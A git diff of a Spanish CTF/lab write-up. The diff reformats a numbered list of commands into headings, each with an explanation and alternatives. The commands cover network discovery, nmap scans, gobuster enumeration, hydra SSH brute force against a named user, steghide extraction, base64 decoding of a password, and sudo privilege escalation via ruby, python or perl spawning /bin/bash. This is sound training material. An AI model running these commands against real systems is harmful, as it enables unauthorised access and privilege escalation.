@@ -31,7 +31,7 @@
 <br>
 # Comandos Usados y su desglose
 
-1. `ip a o ip add`
+## 1. `ip a o ip add`
 
 **Función:** Muestra todas las interfaces de red del sistema.
 
@@ -44,7 +44,7 @@
 * `ip link` (muestra solo los enlaces).
 * `ip route` (muestra rutas de red).
 
-2. `sudo netdiscover -i docker0 -r 172.17.0.0/24`
+## 2. `sudo netdiscover -i docker0 -r 172.17.0.0/24`
 
 **Función:** Descubre dispositivos en una red usando ARP.
 
@@ -59,7 +59,7 @@
 * `arp-scan -l` (alternativa).
 * `nmap -sn 172.17.0.0/24` (también detecta hosts activos).
 
-3. `sudo nmap --min-rate 5000 -p- -sS -sV 172.17.0.2`
+## 3. `sudo nmap --min-rate 5000 -p- -sS -sV 172.17.0.2`
 
 **Función:** Escaneo de puertos y detección de servicios.
 
@@ -74,7 +74,7 @@
 * `nmap -Pn -p 22,80 172.17.0.2` (puertos específicos).
 * `nmap --script vuln 172.17.0.2` (detección de vulnerabilidades).
 
-4. `gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`
+## 4. `gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`
 
 **Función:** Enumeración de directorios en aplicaciones web.
 
@@ -89,7 +89,7 @@
 * `gobuster fuzz -u http://172.17.0.2/FUZZ -w lista.txt`
 * `dirb http://172.17.0.2` (alternativa).
 
-5. `hydra -l carlota -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 10`
+## 5. `hydra -l carlota -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 10`
 
 **Función:** Fuerza bruta de credenciales en servicios.
 
@@ -104,7 +104,7 @@
 * `hydra -s 2222 -l user -P pass.txt ssh://IP` (puerto custom).
 * `medusa -U user.txt -P pass.txt -M ssh -h IP` (alternativa).
 
-6. `ssh carlota@172.17.0.2`
+## 6. `ssh carlota@172.17.0.2`
 
 **Función:** Conexión remota vía protocolo SSH.
 
@@ -117,7 +117,7 @@
 * `ssh -i key.pem user@IP` (clave privada).
 * `sftp user@IP` (acceso seguro a archivos).
 
-7. `cd /home/carlota/Desktop/fotos/vacaciones`
+## 7. `cd /home/carlota/Desktop/fotos/vacaciones`
 
 **Función:** Navegar al directorio específico.
 
@@ -129,7 +129,7 @@
 * `cd ..` (subir un nivel).
 * `cd -` (último directorio).
 
-8. `scp carlota@172.17.0.2:/home/carlota/Desktop/fotos/vacaciones/imagen.jpg /home/kali/Documents/amor`
+## 8. `scp carlota@172.17.0.2:/home/carlota/Desktop/fotos/vacaciones/imagen.jpg /home/kali/Documents/amor`
 
 **Función:** Copia segura de archivos entre hosts.
 
@@ -143,7 +143,7 @@
 * `scp user@host:/file ./`
 * `rsync -avz -e ssh file user@host:/path`
 
-9. `file imagen.jpg`
+## 9. `file imagen.jpg`
 
 **Función:** Detecta el tipo de archivo.
 
@@ -155,7 +155,7 @@
 * `stat archivo` (más detalles).
 * `exiftool archivo.jpg` (metadatos, si aplica).
 
-10. `steghide --extract -sf imagen.jpg`
+## 10. `steghide --extract -sf imagen.jpg`
 
 **Función:** Extrae información oculta en imágenes/audio.
 
@@ -168,7 +168,7 @@
 * `steghide embed -cf imagen.jpg -ef secreto.txt`
 * `zsteg archivo.png` (alternativa para PNG).
 
-11. `echo "ZXNsYWNhc2FkZXBpbnlwb24=" | base64 -d; echo`
+## 11. `echo "ZXNsYWNhc2FkZXBpbnlwb24=" | base64 -d; echo`
 
 **Función:** Decodifica cadenas codificadas en base64.
 
@@ -181,7 +181,7 @@
 * `echo texto | base64` (codifica).
 * `openssl base64 -d` (alternativa).
 
-12. `su oscar`
+## 12. `su oscar`
 
 **Función:** Cambia al usuario oscar.
 
@@ -194,7 +194,7 @@
 * `sudo su -` (como root).
 * `login oscar` (desde terminal login).
 
-13. `sudo -l`
+## 13. `sudo -l`
 
 **Función:** Verifica qué comandos puede ejecutar un usuario con sudo.
 
@@ -207,7 +207,7 @@
 * `sudo -s` (abre shell root).
 * `sudoedit archivo` (edita con privilegios).
 
-14. `sudo /usr/bin/ruby -e 'exec "/bin/bash"'`
+## 14. `sudo /usr/bin/ruby -e 'exec "/bin/bash"'`
 
 **Función:** Escala privilegios usando Ruby para ejecutar bash.
 
@@ -221,7 +221,7 @@
 * `sudo python -c 'import os; os.system("/bin/bash")'`
 * `sudo perl -e 'exec "/bin/bash"'`
 
-15. `whoami`
+## 15. `whoami`
 
 **Función:** Muestra el nombre del usuario actual.
 
